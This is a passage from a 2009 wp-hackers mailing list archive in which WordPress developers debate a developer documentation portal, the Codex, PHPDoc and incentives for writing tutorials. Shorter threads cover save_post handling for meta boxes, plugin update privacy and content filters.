That's a worthy goal, but I'd cite the Codex as a good example of
centralized, collective, voluntary documentation not working like one would
hope it would. This despite the many campaigns to encourage people to
contribute to it.


> Our own Mark/Podz used to have fantastic tutorials on his site, but then he
> started to get overwhelmed with people contacting him for support because
> they were on his site, and then they got out of date and no one else updated
> them because they were "Mark's tutorials."
>

See my note on the community voting on the best tutorials.


> My favorite kind of attribution is collective, "we built this together."
> That's basically what we have on the wp.org about page now (though it's
> woefully incomplete),
>

Mine too. But I'd be careful to not assume this is the position of the
people you hope will provide the documentation for you and the WP community
at large.


>
> I fully expect there to be fantastic stuff posted on other sites just like
> there is today, just because we have some resources/tutorials/documentation
> on the official site doesn't mean the other stuff goes away.



Yeah, you're probably right. I don't doubt that there would still be a
vibrant community of people writing tutorials on their own blogs. Given the
wealth of information that is created DAILY on WP-centric blogs, it makes
sense to leverage all that hard work, doesn't it? Perhaps even encourage it?

Again, I'll cite the Codex as an example of hoping people will voluntarily
contribute to a central tutorial/documentation repository as a pipe dream.
 Whereas we have good evidence to suggest that traffic is a proven
enticement for frequent, high quality documentation.

From ncrice at gmail.com  Mon Dec 14 23:47:23 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Mon, 14 Dec 2009 18:47:23 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <71496CCC-EFB9-4D31-8E43-1838C2DBB78B@newclarity.net>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
	<0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
	<862d087f0912141448y54cb959ap81e62e58af44cf06@mail.gmail.com>
	<4B26C893.8090308@mullenweg.com>
	<71496CCC-EFB9-4D31-8E43-1838C2DBB78B@newclarity.net>
Message-ID: <862d087f0912141547r6fffc11fk927fe71aae0992d@mail.gmail.com>

On Mon, Dec 14, 2009 at 6:32 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

>
> To Nathan's point, Nathan writes because it gets him exposure which
> ultimately helps him pay his bills.  For entrepreneurs (vs. employees of
> some organization) that exposure *allows* them to continue contributing to
> the WordPress community.  Automattic, OTOH, is making money from all this so
> they don't feel the pain.
>

For the record, I don't have a dog in this race. I rarely write tutorials on
my blog. It's a LOT of work to write a quality tutorial, and I honestly
don't have that much time, nor do I need the traffic (or the money the
traffic might generate).


>
> I have zero qualms about Automattic making money, it should, I just want
> everyone to realize that free help to WordPress grows Automatic's revenue
> but does absolutely nothing for those individuals whose bills are paid by
> the ability to get paying work because of their *visible* contribution. Not
> acknowledging that and not considering how to make it easier for those
> people to get business who have contributed seems very disingenuous to me.
>

You make a decent point, though I'm not sure how a central documentation
site makes Automattic any money.

But it does stand to reason that if you want to encourage participation, it
seems likely that some sort of perceivable personal benefit might do the
trick better than high hopes will.

That said, WP.org is Matt's site and he can do whatever he thinks is best
with it. I'm just trying to make the case that he'll catch more flies with
honey than nothing. I could be wrong, though.

Nathan

From mikeschinkel at newclarity.net  Mon Dec 14 23:54:26 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 14 Dec 2009 18:54:26 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <862d087f0912141547r6fffc11fk927fe71aae0992d@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
	<0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
	<862d087f0912141448y54cb959ap81e62e58af44cf06@mail.gmail.com>
	<4B26C893.8090308@mullenweg.com>
	<71496CCC-EFB9-4D31-8E43-1838C2DBB78B@newclarity.net>
	<862d087f0912141547r6fffc11fk927fe71aae0992d@mail.gmail.com>
Message-ID: <B21D17A8-4BF8-4C2E-A414-CA057C4AAC70@newclarity.net>

On Dec 14, 2009, at 6:47 PM, Nathan Rice wrote:
> On Mon, Dec 14, 2009 at 6:32 PM, Mike Schinkel
> <mikeschinkel at newclarity.net>wrote:
>> To Nathan's point, Nathan writes because it gets him exposure which
>> ultimately helps him pay his bills.  For entrepreneurs (vs. employees of
>> some organization) that exposure *allows* them to continue contributing to
>> the WordPress community.  Automattic, OTOH, is making money from all this so
>> they don't feel the pain.
> 
> For the record, I don't have a dog in this race. I rarely write tutorials on
> my blog. It's a LOT of work to write a quality tutorial, and I honestly
> don't have that much time, nor do I need the traffic (or the money the
> traffic might generate).

My bad, I assumed wrongly.

>> I have zero qualms about Automattic making money, it should, I just want
>> everyone to realize that free help to WordPress grows Automatic's revenue
>> but does absolutely nothing for those individuals whose bills are paid by
>> the ability to get paying work because of their *visible* contribution. Not
>> acknowledging that and not considering how to make it easier for those
>> people to get business who have contributed seems very disingenuous to me.
>> 
> 
> You make a decent point, though I'm not sure how a central documentation
> site makes Automattic any money.

Growing WordPress grows Automattic's influence and potential market.  It's indirect, but straightforward.

> But it does stand to reason that if you want to encourage participation, it
> seems likely that some sort of perceivable personal benefit might do the
> trick better than high hopes will.

My favorite book ever is Kevin Kelley's 1998  "New Rules for the New Economy."  One of it's many lessons is that if you want to grow something, help other people make money by contributing to your growth.  Open-source ethos is *great* and foundational; we can't do without it. But at a certain point w/o economic incentive too you can only go so far.  And it doesn't have to be an either/or scenario.

> That said, WP.org is Matt's site and he can do whatever he thinks is best
> with it. I'm just trying to make the case that he'll catch more flies with
> honey than nothing. I could be wrong, though.

Agree 100%.

-Mike

From lynne.pope at gmail.com  Tue Dec 15 00:22:18 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Tue, 15 Dec 2009 13:22:18 +1300
Subject: [wp-hackers] Plugin Privacy Option (was Revisiting phone home
	and privacy)
In-Reply-To: <e1202cb10912140656w74b30d33ibca4c88aa0e4fd23@mail.gmail.com>
References: <4B1FC578.8010706@gaarai.com>
	<4BE2C583-2DC1-49CF-BD18-D4493E61B48B@striderweb.com> 
	<e1202cb10912131553m1f8a4346q3689d2c9a20bcc38@mail.gmail.com> 
	<71ddd7490912131603g71eb2e61nf1aa42de39cc6d00@mail.gmail.com> 
	<31D97E2E-996B-48C9-B093-BFBE9AE6BBD9@striderweb.com>
	<e1202cb10912140656w74b30d33ibca4c88aa0e4fd23@mail.gmail.com>
Message-ID: <427667db0912141622o4887af44s1b03edfa5be93bab@mail.gmail.com>

2009/12/15 Jeremy Clarke <jer at simianuprising.com>

>
> It's a good idea too, though part of a bigger plan. The plugin code
> that achieves the same thing is much more likely to be a solution :)
>

Plugin code only helps those of us who know what data is being collected and
how to hack.
Plugins also have to be activated which means the private data has already
had a send before the plugin kicks in.


>
> Has anyone created a Codex page about this whole issue? It would be
> good to have this code there. Anyone with strong feelings about the
> issue want to put one together? It could have sections explaining each
> part of the update process and have ways of circumventing each:
> Sending url, sending server info, sending plugins list.
>

Do you really think that's a good idea?
The most common comment I've had to my blog post listing details of what is
sent (http://lynnepope.net/data-wordpress-sends) has been, "holy s**t!" and
several people have said they are walking away from WordPress. These are all
people who do know code and who can anonymise update checks.
If that is their reaction I can imagine a much stronger one from those users
who are inexperienced with code.

Mark has kindly posted this: Excluding your plugin or theme from update
checks ? Mark on WordPress http://j.mp/6uecLJ

My personal opinion is that we shouldn't scare users just yet. Plugins don't
address the privacy issues. Matt has indicated that he will be speaking to
lawyers next year with the view to improving the WordPress privacy
statement. It might pay to wait till then before taking this to the Codex.

Lynne

From johnbillion+wp at gmail.com  Tue Dec 15 00:26:04 2009
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Tue, 15 Dec 2009 00:26:04 +0000
Subject: [wp-hackers] Handling Custom Meta Boxes
In-Reply-To: <349fe48b0912141404r5bce99c9s4969bd191ce0e063@mail.gmail.com>
References: <62961.193.75.63.21.1260736434.squirrel@webmail.mailadmin.no>
	<161617690912140646na98c5e4y9042f435b05fc5fb@mail.gmail.com>
	<op.u4x6varuspxmuu@dd32> <4B26B559.3030408@voceconnect.com>
	<349fe48b0912141404r5bce99c9s4969bd191ce0e063@mail.gmail.com>
Message-ID: <1fa535a70912141626o3f04bc25udbfb7661fddfef50@mail.gmail.com>

You might want to also check that the post isn't a revision, as IIRC
the save_post hook is fired twice for each save - once for the post
and once for the revision. wp_is_post_revision() and
wp_is_post_autosave() are handy functions for this.

John

On Mon, Dec 14, 2009 at 10:04 PM, scribu <scribu at gmail.com> wrote:
> Besides DOING_AUTOSAVE, also check for DOING_AJAX and DOING_CRON.
>
>
> On Mon, Dec 14, 2009 at 11:59 PM, Michael Pretty <mpretty at voceconnect.com>wrote:
>
>> I'm curious how most plugin developers handle saving settings from custom
>> post meta_boxes. ?I've always handled this by adding an action to save the
>> result on 'save_post' and only updating if DOING_AUTOSAVE wasn't defined.
>> ?The problem with doing this, is that the save_post action is also called
>> when a scheduled item is moved to published. ?If this happens, the posted
>> values from the meta_box isn't available and I can't alway use isset since
>> that means I can never use checkboxes for input.
>>
>> Suggestions?
>>
>> Thank you.
>>
>> -Michael (prettyboymp)
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From skeltoac at gmail.com  Tue Dec 15 01:51:49 2009
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon, 14 Dec 2009 19:51:49 -0600
Subject: [wp-hackers] Blog Stats from WordPress.com to stand-alone
	wordpress?..
In-Reply-To: <9aa12a490912140002y3a5a46f0k89603887f993a60e@mail.gmail.com>
References: <9aa12a490912110600l36ea8481o1442883e7546f79b@mail.gmail.com>
	<7f49e8010912110618v3952b38dg6720bf2d3a9eb423@mail.gmail.com>
	<9aa12a490912110756w2b8970e6y6d57e364deb503a7@mail.gmail.com>
	<9aa12a490912130029i6184d388g451853535d2f4fc2@mail.gmail.com>
	<5a1dad880912130920h6b5381fao61669d59f5215f2d@mail.gmail.com>
	<e1202cb10912131700u6757e591ie258743449d81210@mail.gmail.com>
	<4B258E8E.1070001@rotorised.com>
	<9aa12a490912140002y3a5a46f0k89603887f993a60e@mail.gmail.com>
Message-ID: <e6ec604d0912141751m5aa4611et4e6d9dfdfa681d5@mail.gmail.com>

On Mon, Dec 14, 2009 at 2:02 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:
> Alex, Jeremy, that's exactly what I'm trying to daccomplish - to find
> a way to associate ex-wordpress.com blog stats with new standalone
> installation (domain will stay the same).
>
> Ryan, I see that drop down selection box too, but the problem is that
> wordpress.com based blogs do not make their way into it (don't know
> why).

Hi Davit. There is not a way for you to migrate that stats data to a
self-hosted blog because the system identifies self-hosted blogs
differently. I'm sorry about that.

Andy

From wordpress at santosj.name  Tue Dec 15 03:07:45 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Mon, 14 Dec 2009 21:07:45 -0600
Subject: [wp-hackers] Developer portal
In-Reply-To: <e1202cb10912131045u19d3b0c9x3242ee569e04b323@mail.gmail.com>
References: <299277.18493.qm@web65707.mail.ac4.yahoo.com>	<256D5C1E-3439-4654-9741-33012EEF84F5@newclarity.net>	<4B252A33.1030508@armeda.com>
	<e1202cb10912131045u19d3b0c9x3242ee569e04b323@mail.gmail.com>
Message-ID: <4B26FD81.5040707@santosj.name>

I will say one thing that PHPdoc is not meant for end users. Yeah, I was 
thinking towards the end that examples would be good and it is nice that 
someone can go back and add them. Furthermore, anyone can create a 
ticket and provide additional documentation wording for files and 
functions. Not the best solution, but it is a possible solution that can 
be done to allow those who are able to create patches to do so. It just 
would be faster for someone to create a patch to get in rather than 
someone creating a patch and then waiting for that to get in.

Really, you have the developer API, which is the PHPdoc, which does 
allow for being as up-to-date with the code changes. Not always, some 
functionality has changed in the past, with additional parameters and 
the phpdoc not being updated or out-of-date, but generally, if the 
person making the patch is paying attention, then the phpdoc should be 
updated as well. The Php.net for the most part is a developer API. One 
with many examples and sometimes combines other functions for great 
benefit, but for the most part just tells you how to use the functions 
and what they are for.

The codex I believe takes a lot of time and is a lot of work. I think 
that is part of the problem, if you are going to spend the hours it 
takes to write an article, then I think most people would rather do it 
on their own web site so that they can get the traffic. In the past, 
from what I've seen some have been wrong, incomplete, and become 
outdated. There have been many times that I wanted to take a post and 
update it, but there is the whole copyright issue and I didn't feel like 
rewriting a lot of what was already good content.

Well, PHP.net uses DocBook, so there isn't any reason why it couldn't be 
like the Codex. The contributors and the maintainers probably just wish 
to have it that way so that they don't spend all of their time writing 
every possible usage case for functions. People should discover other 
ways to use functions on their own and with time they usually do. Same 
way with WordPress. Most of the functions aren't often used together to 
create an component. Most could use a few examples and be done with 
them. The examples could even be part of the phpdoc, but I caution doing 
so because it requires special styling to be pretty and that isn't easy.

The problem has been and will always be finding contributors to creating 
these examples. Mostly I think it is a good idea to have a tutorial 
collection section so that people can get external sources to solutions. 
Some people have very good tutorials that beat out anything that is on 
the Codex and it is better I think to give them some link love. The 
point should be education and while it isn't central to where anyone can 
immediately find what they are looking for, the incentive for writing 
something is there and I think that is what matters. If someone wanted 
to ask for permission to put in the WordPress DocBook project and, or 
the Codex, then that would be good as well.

More people might be willing to put tutorials and information on their 
own sites than the Codex. I don't think asking people, and I don't think 
you are personally, to give up their time is productive. People have a 
number of reasons to contribute, but when you increase that incentive or 
provide an incentive you increase the odds that people will do so.

Oh yeah, my point actually was that there should be both the Codex / 
DocBook and the PHPdoc and that they should complement each other.

Jacob Santos

Jeremy Clarke wrote:
> I think the best function documentation is and should be the source
> itself. When the PHPDoc descriptions are well done they are incredibly
> useful, especially for people who use IDEs like NetBeans or Eclipse,
> where the result is that you have the docs in your face as you write
> your code (seriously guys, if you tried WP in an IDE before version
> 2.5 or so you should try it again, the value of autocomplete
> skyrocketed with the addition of PHPDoc)
>
> Whatever the solution for the function docs ends up being it should be
> based on the phpdoc inside WP, at least for the core descriptions,
> which can be up to several lines long and in many cases are all you
> are likely to need when coding. Using PHPDoc also means that even if
> this new reference gets old and dies the docs are still there and
> tools like PHPXref will continue to derive intense utility from their
> presence.
>
> For longer descriptions and examples I think php.net is a clear winner
> in terms of how to organize it. Offer at least one example for each
> function and have a space for comments, along with a rating system
> that votes comments up if they are useful. Stack Overflow is also
> probably a good source of inspiration for the comments. If we thought
> of the 'comments' as 'tips' or something and treated them as each
> their own thing then a voting system would be really useful for
> effectively defining best practices and having them show at the top.
> If there was a manager of this thing they could also obviously
> incorporate the best 'tips' into the core document itself. Maybe each
> top-level comment is a 'tip', while sub-comments are comments on the
> tip.
>
> If the function reference doesn't inherently involve an Xref style
> linking structure that explains where functions are used in core and
> links back and forth to definitions then it should also include links
> to a PHPxref install. I.e. on each function you'd have a link "See
> this function defined in Xref" and "See uses of this function in WP
> Core Xref" that link to the right places on Westi's phpxref
> (preferably after migrating it to wordpress.org)
>
> Ideally the solution would also simplify the process of helping to add
> to the PHPdocs inside WP. Keeping all community documentation effort
> inside the code itself is the best way to ensure that nothing is
> duplicated and everything is kept up to date (after all, its easier to
> double-check the actual function definition in the code when you edit
> a function then to search the whole internet for code examples you've
> deprecated).
>
> IMHO it is currently too hard to help with the PHPDoc effort. While
> for some of us using trunk SVN, exporting diffs, and using Trac feel
> natural I think we can all agree that it is a specialized system and
> is in no way obvious or friendly to people who just want to help with
> documenting their favorite functions. Updating/adding a phpdoc should
> only take a few minutes, and doesn't need to involved  learning the
> byzantine ways of WP Core Development.
>
> It seems to me that a submission process that removes all that cruft
> would be very much worth it. Something like a button on the function
> reference that says 'suggest a better phpdoc for this function'. The
> user could then write a better doc and submit. At that point it could
> be emailed to a core developer in charge of PHPDoc. For that core
> developer turning the doc into a patch and committing would take like
> 2 minutes, be very unlikely to cause problems, and wouldn't involve a
> long trac issue explaining it. They'd probably want to double-check
> that the docs are accurate, but they have to do that anyway right now.
> IMHO taking some text, incorporating it into their local working copy,
> and committing it would probably take *less* time for a core dev than
> dealing with a trac ticket and patch, as well as making it like 90%
> faster for the submitter. I know I would use this tool even though I
> know how to make patches and use trac.
>
> In terms of best practice documents I've found that the most useful
> docs are the ones that cover a whole API explicitly and
> authoritatively. Codex articles like Widgets API, Shortcodes API etc
> are very useful and provide a perfect place for wikipedia style
> 'external links' to articles that explain it in more personal terms.
> In this new portal I think the function descriptions should be atomic
> and anything else should be abstracted into some API that can have a
> holistic page about its use. This way there are only two kinds of
> pages, which IMHO will help with the redundancy experienced in the
> codex. Each function doc should also link to any relevant APIs, which
> wouldn't be too hard to do by just going through the (hopefully
> relatively short) list of API articles and adding all that apply to
> the function. If its actually based on WP then each API could even be
> a category, and you could just check the categories appropriate for
> each function (I think I just blew my own mind).
>
> One last thing: There will need a paid Automattic employee who knows
> how to code and is in charge of maintenance and updating things based
> on user feedback. I hate to give up on the community does everything
> model, but unless someone is personally responsible for this it will,
> eventually, rot and crumble like the wiki.
>
> Apologies for the incredibly long reply to an already long thread,
> hope everyone is having a good Sunday :)
>
>   

From mikeschinkel at newclarity.net  Tue Dec 15 04:53:34 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 14 Dec 2009 23:53:34 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B26FD81.5040707@santosj.name>
References: <299277.18493.qm@web65707.mail.ac4.yahoo.com>	<256D5C1E-3439-4654-9741-33012EEF84F5@newclarity.net>	<4B252A33.1030508@armeda.com>
	<e1202cb10912131045u19d3b0c9x3242ee569e04b323@mail.gmail.com>
	<4B26FD81.5040707@santosj.name>
Message-ID: <C7423428-26A2-4DCC-BFD3-BA8F16328577@newclarity.net>

Here are some thoughts: We had a simple modification of a WordPress site were we could have a tutorial and/or the basic documentation for a function or a concept and then in the comments people in the community could add their suggestions and even include a summary along with related articles. 

The users could select a comment type and one of the types could be link to a related article along with appropriate fields.  Users could also give thumbs up or thumbs down for being helpful, and if the vote goes negative those would be hidden. The comments could also be displayed in descending vote order with newer comments given a month at the top (unless voted negative.)

A process could also test links periodically and mark the bad links.

Periodically the keepers of the content could revise the main article and incorporate the better comments including an acknowledgement of the person who made the contribution and a link to their article.

This approach would provide great content, community involvement, and individual incentives for contributing.

-Mike

On Dec 14, 2009, at 10:07 PM, Jacob Santos wrote:

> I will say one thing that PHPdoc is not meant for end users. Yeah, I was thinking towards the end that examples would be good and it is nice that someone can go back and add them. Furthermore, anyone can create a ticket and provide additional documentation wording for files and functions. Not the best solution, but it is a possible solution that can be done to allow those who are able to create patches to do so. It just would be faster for someone to create a patch to get in rather than someone creating a patch and then waiting for that to get in.
> 
> Really, you have the developer API, which is the PHPdoc, which does allow for being as up-to-date with the code changes. Not always, some functionality has changed in the past, with additional parameters and the phpdoc not being updated or out-of-date, but generally, if the person making the patch is paying attention, then the phpdoc should be updated as well. The Php.net for the most part is a developer API. One with many examples and sometimes combines other functions for great benefit, but for the most part just tells you how to use the functions and what they are for.
> 
> The codex I believe takes a lot of time and is a lot of work. I think that is part of the problem, if you are going to spend the hours it takes to write an article, then I think most people would rather do it on their own web site so that they can get the traffic. In the past, from what I've seen some have been wrong, incomplete, and become outdated. There have been many times that I wanted to take a post and update it, but there is the whole copyright issue and I didn't feel like rewriting a lot of what was already good content.
> 
> Well, PHP.net uses DocBook, so there isn't any reason why it couldn't be like the Codex. The contributors and the maintainers probably just wish to have it that way so that they don't spend all of their time writing every possible usage case for functions. People should discover other ways to use functions on their own and with time they usually do. Same way with WordPress. Most of the functions aren't often used together to create an component. Most could use a few examples and be done with them. The examples could even be part of the phpdoc, but I caution doing so because it requires special styling to be pretty and that isn't easy.
> 
> The problem has been and will always be finding contributors to creating these examples. Mostly I think it is a good idea to have a tutorial collection section so that people can get external sources to solutions. Some people have very good tutorials that beat out anything that is on the Codex and it is better I think to give them some link love. The point should be education and while it isn't central to where anyone can immediately find what they are looking for, the incentive for writing something is there and I think that is what matters. If someone wanted to ask for permission to put in the WordPress DocBook project and, or the Codex, then that would be good as well.
> 
> More people might be willing to put tutorials and information on their own sites than the Codex. I don't think asking people, and I don't think you are personally, to give up their time is productive. People have a number of reasons to contribute, but when you increase that incentive or provide an incentive you increase the odds that people will do so.
> 
> Oh yeah, my point actually was that there should be both the Codex / DocBook and the PHPdoc and that they should complement each other.
> 
> Jacob Santos
> 
> Jeremy Clarke wrote:
>> I think the best function documentation is and should be the source
>> itself. When the PHPDoc descriptions are well done they are incredibly
>> useful, especially for people who use IDEs like NetBeans or Eclipse,
>> where the result is that you have the docs in your face as you write
>> your code (seriously guys, if you tried WP in an IDE before version
>> 2.5 or so you should try it again, the value of autocomplete
>> skyrocketed with the addition of PHPDoc)
>> 
>> Whatever the solution for the function docs ends up being it should be
>> based on the phpdoc inside WP, at least for the core descriptions,
>> which can be up to several lines long and in many cases are all you
>> are likely to need when coding. Using PHPDoc also means that even if
>> this new reference gets old and dies the docs are still there and
>> tools like PHPXref will continue to derive intense utility from their
>> presence.
>> 
>> For longer descriptions and examples I think php.net is a clear winner
>> in terms of how to organize it. Offer at least one example for each
>> function and have a space for comments, along with a rating system
>> that votes comments up if they are useful. Stack Overflow is also
>> probably a good source of inspiration for the comments. If we thought
>> of the 'comments' as 'tips' or something and treated them as each
>> their own thing then a voting system would be really useful for
>> effectively defining best practices and having them show at the top.
>> If there was a manager of this thing they could also obviously
>> incorporate the best 'tips' into the core document itself. Maybe each
>> top-level comment is a 'tip', while sub-comments are comments on the
>> tip.
>> 
>> If the function reference doesn't inherently involve an Xref style
>> linking structure that explains where functions are used in core and
>> links back and forth to definitions then it should also include links
>> to a PHPxref install. I.e. on each function you'd have a link "See
>> this function defined in Xref" and "See uses of this function in WP
>> Core Xref" that link to the right places on Westi's phpxref
>> (preferably after migrating it to wordpress.org)
>> 
>> Ideally the solution would also simplify the process of helping to add
>> to the PHPdocs inside WP. Keeping all community documentation effort
>> inside the code itself is the best way to ensure that nothing is
>> duplicated and everything is kept up to date (after all, its easier to
>> double-check the actual function definition in the code when you edit
>> a function then to search the whole internet for code examples you've
>> deprecated).
>> 
>> IMHO it is currently too hard to help with the PHPDoc effort. While
>> for some of us using trunk SVN, exporting diffs, and using Trac feel
>> natural I think we can all agree that it is a specialized system and
>> is in no way obvious or friendly to people who just want to help with
>> documenting their favorite functions. Updating/adding a phpdoc should
>> only take a few minutes, and doesn't need to involved  learning the
>> byzantine ways of WP Core Development.
>> 
>> It seems to me that a submission process that removes all that cruft
>> would be very much worth it. Something like a button on the function
>> reference that says 'suggest a better phpdoc for this function'. The
>> user could then write a better doc and submit. At that point it could
>> be emailed to a core developer in charge of PHPDoc. For that core
>> developer turning the doc into a patch and committing would take like
>> 2 minutes, be very unlikely to cause problems, and wouldn't involve a
>> long trac issue explaining it. They'd probably want to double-check
>> that the docs are accurate, but they have to do that anyway right now.
>> IMHO taking some text, incorporating it into their local working copy,
>> and committing it would probably take *less* time for a core dev than
>> dealing with a trac ticket and patch, as well as making it like 90%
>> faster for the submitter. I know I would use this tool even though I
>> know how to make patches and use trac.
>> 
>> In terms of best practice documents I've found that the most useful
>> docs are the ones that cover a whole API explicitly and
>> authoritatively. Codex articles like Widgets API, Shortcodes API etc
>> are very useful and provide a perfect place for wikipedia style
>> 'external links' to articles that explain it in more personal terms.
>> In this new portal I think the function descriptions should be atomic
>> and anything else should be abstracted into some API that can have a
>> holistic page about its use. This way there are only two kinds of
>> pages, which IMHO will help with the redundancy experienced in the
>> codex. Each function doc should also link to any relevant APIs, which
>> wouldn't be too hard to do by just going through the (hopefully
>> relatively short) list of API articles and adding all that apply to
>> the function. If its actually based on WP then each API could even be
>> a category, and you could just check the categories appropriate for
>> each function (I think I just blew my own mind).
>> 
>> One last thing: There will need a paid Automattic employee who knows
>> how to code and is in charge of maintenance and updating things based
>> on user feedback. I hate to give up on the community does everything
>> model, but unless someone is personally responsible for this it will,
>> eventually, rot and crumble like the wiki.
>> 
>> Apologies for the incredibly long reply to an already long thread,
>> hope everyone is having a good Sunday :)
>> 
>>  
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From matilda.griswold at googlemail.com  Tue Dec 15 08:48:50 2009
From: matilda.griswold at googlemail.com (Matilda Griswold)
Date: Tue, 15 Dec 2009 08:48:50 +0000
Subject: [wp-hackers] Developer portal
Message-ID: <6d6f32d00912150048y15058659xf756f2cd9f39137e@mail.gmail.com>

Dear Mike,

I've been meaning to ask.

Are you just this big-picture sort of guy who just loves to explain
(in glorious detail) to the world how he'd prefer things be? Do you
spend a tenth as much time actually working on things as you do
discussing them on mailing lists? If you do, I'd love to know where
you find the time. :)

Along with all your thoughts on how a community should be managed and
how good software should be written, could you please point us to any
interesting tutorials or plugins (or anything useful, really) you have
released? I'd be fascinated to check them out.

Thanks!
Matilda

On 15/12/2009 04:53, Mike Schinkel wrote:
> Here are some thoughts: We had a simple modification of a WordPress
> site were we could have a tutorial and/or the basic documentation for
> a function or a concept and then in the comments people in the
> community could add their suggestions and even include a summary along
> with related articles.
>
> The users could select a comment type and one of the types could be
> link to a related article along with appropriate fields.  Users could
> also give thumbs up or thumbs down for being helpful, and if the vote
> goes negative those would be hidden. The comments could also be
> displayed in descending vote order with newer comments given a month
> at the top (unless voted negative.)
>
> A process could also test links periodically and mark the bad links.
>
> Periodically the keepers of the content could revise the main
> article and incorporate the better comments including an
> acknowledgement of the person who made the contribution and a link to
> their article.
>
> This approach would provide great content, community involvement,
> and individual incentives for contributing.
>
> -Mike

From Ken at adcSTUDIO.com  Tue Dec 15 16:05:47 2009
From: Ken at adcSTUDIO.com (Ken Newman)
Date: Tue, 15 Dec 2009 11:05:47 -0500
Subject: [wp-hackers] newlines from rich text editor do not convert to
 paragraphs
In-Reply-To: <349fe48b0912140800m6bf7ca82r30d767c90cce66c0@mail.gmail.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>	<9aa12a490912130106v69ea595eva2cebebc1104da51@mail.gmail.com>	<d7153760912130310j730d17edid3bfdae64bbc43a3@mail.gmail.com>	<op.u4viywoaspxmuu@dd32>	<9aa12a490912130338p4416e9eayeb5824097b8f6f01@mail.gmail.com>	<op.u4vk6lrdspxmuu@dd32>	<d7153760912130751h533bbad1p9c3405553a4585f5@mail.gmail.com>	<4B25F1CE.9060805@laptoptips.ca>	<9aa12a490912140349p41f18f1dg5d8c819bc3075a91@mail.gmail.com>	<9aa12a490912140432h43248b76jf776906ff1f4471d@mail.gmail.com>
	<349fe48b0912140800m6bf7ca82r30d767c90cce66c0@mail.gmail.com>
Message-ID: <4B27B3DB.7040509@adcSTUDIO.com>

On 12/14/2009 11:00 AM, scribu wrote:
> On Mon, Dec 14, 2009 at 2:32 PM, Davit Barbakadze<jayarjo at gmail.com>  wrote:
>
>    
>> Probably it would have been more logical applying filters attached to
>> 'the_content' hook within get_the_content() function. This way we
>> could get filtered content echoed via the_content() tag, filtered
>> content in a string via get_the_content() and pure content via
>> $post->post_content.
>>
>>      
> You can apply the filter yourself:
>
> $filtered_content = apply_filters('the_content', get_the_post_content());
>
>
>    
Would it be considered good practice do this, say, in child theme's 
function file?

From wp at xentek.net  Tue Dec 15 17:27:31 2009
From: wp at xentek.net (Eric Marden)
Date: Tue, 15 Dec 2009 12:27:31 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <77b239a00912141451x35ab5c0y7799347bd61689b9@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
	<0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
	<77b239a00912141451x35ab5c0y7799347bd61689b9@mail.gmail.com>
Message-ID: <C2628E87-D59D-4205-97E1-AC81AB4C7B9F@xentek.net>

On Dec 14, 2009, at 5:51 PM, Thomas Belknap wrote:

> The CakePHP site has the Bakery, which seems - to the extent that I've
> visited it, which is perhaps not a lot - decently active.


It also suggest many techniques that are out of date, plain wrong, or  
solutions that break with many of the CakePHP conventions. I don't  
trust the bakery (even though I want to), and instead use a  
combination of the 'Cookbook' and phpdocs.

This is not a good example of a developer portal, in structure or  
substance, in my opinion.


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From wp at xentek.net  Tue Dec 15 17:29:43 2009
From: wp at xentek.net (Eric Marden)
Date: Tue, 15 Dec 2009 12:29:43 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <862d087f0912141541i4b484231jb1185cc499053e66@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
	<0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
	<862d087f0912141448y54cb959ap81e62e58af44cf06@mail.gmail.com>
	<4B26C893.8090308@mullenweg.com>
	<862d087f0912141541i4b484231jb1185cc499053e66@mail.gmail.com>
Message-ID: <5B1D9D9A-32C3-4405-9887-2CDFB95C6879@xentek.net>

On Dec 14, 2009, at 6:41 PM, Nathan Rice wrote:

> See my note on the community voting on the best tutorials.


Voting won't solve anything. It will eventually be gamed, much like  
Digg did. If Digg can't solve that issue, we won't have a chance.


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From dragonfly at dragonflyeye.net  Tue Dec 15 17:47:35 2009
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Tue, 15 Dec 2009 12:47:35 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <C2628E87-D59D-4205-97E1-AC81AB4C7B9F@xentek.net>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
	<0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
	<77b239a00912141451x35ab5c0y7799347bd61689b9@mail.gmail.com>
	<C2628E87-D59D-4205-97E1-AC81AB4C7B9F@xentek.net>
